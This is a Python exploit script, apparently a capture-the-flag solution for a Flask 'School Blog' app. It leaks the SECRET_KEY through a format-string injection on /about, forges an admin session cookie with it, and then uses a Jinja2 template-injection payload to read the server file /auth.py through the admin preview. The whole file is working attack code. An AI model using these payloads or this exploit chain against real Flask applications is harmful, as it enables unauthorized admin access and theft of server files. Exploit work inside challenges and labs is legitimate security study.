#!/usr/bin/env python3
"""School Blog CTF exploit: format injection -> forged session -> SSTI."""
import argparse
import html
import re
import sys

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface


def forge_cookie(secret):
    app = Flask(__name__)
    app.secret_key = secret
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    return serializer.dumps({'username': 'guest', 'role': 'admin'})


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('url', help='Base URL, e.g. http://127.0.0.1:22521')
    parser.add_argument('--timeout', type=float, default=10)
    args = parser.parse_args()
    base = args.url.rstrip('/')
    session = requests.Session()
    try:
        r = session.get(base + '/about', params={'msg': 'KEYSTART{config[SECRET_KEY]}KEYEND'}, timeout=args.timeout)
        r.raise_for_status()
        match = re.search(r'KEYSTART(.*?)KEYEND', html.unescape(r.text), re.S)
        if not match:
            raise RuntimeError('SECRET_KEY not found in /about response')
        secret = match.group(1).strip()
        print('[+] SECRET_KEY:', secret)

        session.cookies.set('session', forge_cookie(secret))
        r = session.get(base + '/admin', timeout=args.timeout)
        print('[+] GET /admin:', r.status_code)
        if r.status_code != 200:
            raise RuntimeError('Admin access denied')

        payload = "{{ get_flashed_messages.__globals__.__builtins__.open('/auth.py').read() }}"
        r = session.post(base + '/admin/save', data={'draft': payload}, timeout=args.timeout)
        print('[+] POST /admin/save:', r.status_code)
        r.raise_for_status()
        r = session.get(base + '/admin/preview', timeout=args.timeout)
        print('[+] GET /admin/preview:', r.status_code)
        r.raise_for_status()
        print('[+] Preview output:\n' + r.text.strip())
    except (requests.RequestException, RuntimeError) as e:
        print('[-] Error:', e, file=sys.stderr)
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())
